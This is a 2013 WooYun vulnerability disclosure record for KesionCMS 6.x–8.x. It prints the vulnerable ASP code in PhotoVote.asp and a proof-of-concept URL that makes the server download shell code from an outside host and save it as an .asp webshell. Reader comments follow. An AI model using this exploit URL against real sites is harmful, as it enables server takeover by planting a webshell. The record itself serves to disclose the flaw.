{"id": 13616, "wybug_id": "wooyun-2013-019000", "wybug_title": "科讯 6.x~8.x getshell 0day", "wybug_corp": "KesionCMS", "wybug_author": "My5t3ry", "wybug_date": "2013-02-21 17:49", "wybug_open_date": "2013-04-07 17:51", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["科讯"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-04-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 未对提交参数判断，导致可以写任意文件到服务器上... 详细说明：  Wap/Plus/PhotoVote.asp 14 - 23\nDim KS:Set KS=New PublicClsDim ID:ID = Replace(KS.S(\"ID\"),\" \",\"\")Dim ChannelID:ChannelID=KS.G(\"ChannelID\")If ChannelID=\"\" Then ChannelID=2If KS.G(\"LocalFileName\")<>\"\" And KS.G(\"RemoteFileUrl\")<>\"\" Then   If KS.SaveBeyondFile(KS.G(\"LocalFileName\"),KS.G(\"RemoteFileUrl\"))= True Then      Response.write KS.G(\"LocalFileName\")'错误提示   End IfEnd If代码略……\t'==================================================\t'过程名：SaveBeyondFile\t'作  用：保存远程的文件到本地\t'参  数：LocalFileName ------ 本地文件名\t'参  数：RemoteFileUrl ------ 远程文件URL\t'==================================================\tFunction SaveBeyondFile(LocalFileName,RemoteFileUrl)\t    On Error Resume Next\t\tSaveBeyondFile=True\t\tdim Ads,Retrieval,GetRemoteData\t\tSet Retrieval = Server.CreateObject(\"Microsoft.XMLHTTP\")\t\tWith Retrieval\t\t\t.Open \"Get\", RemoteFileUrl, False, \"\", \"\"\t\t\t.Send\t\t\tIf .Readystate<>4 then\t\t\t\tSaveBeyondFile=False\t\t\t\tExit Function\t\t\tEnd If\t\t\tGetRemoteData = .ResponseBody\t\tEnd With\t\tSet Retrieval = Nothing\t\tSet Ads = Server.CreateObject(\"Adodb.Stream\")\t\tWith Ads\t\t\t.Type = 1\t\t\t.Open\t\t\t.Write GetRemoteData\t\t\t.SaveToFile server.MapPath(LocalFileName),2\t\t\t.Cancel()\t\t\t.Close()\t\tEnd With\t\tIf Err.Number<>0 Then\t\t   Err.Clear\t\t   SaveBeyondFile=False\t\t   Exit Function\t\tEnd If\t\tSet Ads=nothing\tEnd Function\n上面的代码中这几句：If KS.G(\"LocalFileName\")<>\"\" And KS.G(\"RemoteFileUrl\")<>\"\" Then   If KS.SaveBeyondFile(KS.G(\"LocalFileName\"),KS.G(\"RemoteFileUrl\"))= True Then      Response.write KS.G(\"LocalFileName\")'错误提示   End IfEnd IfKS.G(\"LocalFileName\")和KS.G(\"RemoteFileUrl\")仅仅是判断是否为空并过滤一些SQL字符然后就写文件了！   漏洞证明：  登陆后访问:http://www.t00ls.net/Wap/Plus/PhotoVote.asp?LocalFileName=cc.asp&RemoteFileUrl=http://www.bksec.net/1.txt成功会在Wap/Plus下写入cc.asp,并返回文件名，其中的1.txt为shell代码。。   修复方案：  判断&过滤,你懂懂   版权声明：转载请注明来源 My5t3ry@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-21 19:19 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  getshell~ 马克    \n     2013-02-21 19:24 |    \t\t逍遥 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:40        | 屌丝一个，求基友！)\t\t \n  马克    \n     2013-02-21 19:28 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  直接getshell啊？命令执行？    \n     2013-02-21 20:55 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  @cnrstar 嗯 写文件    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}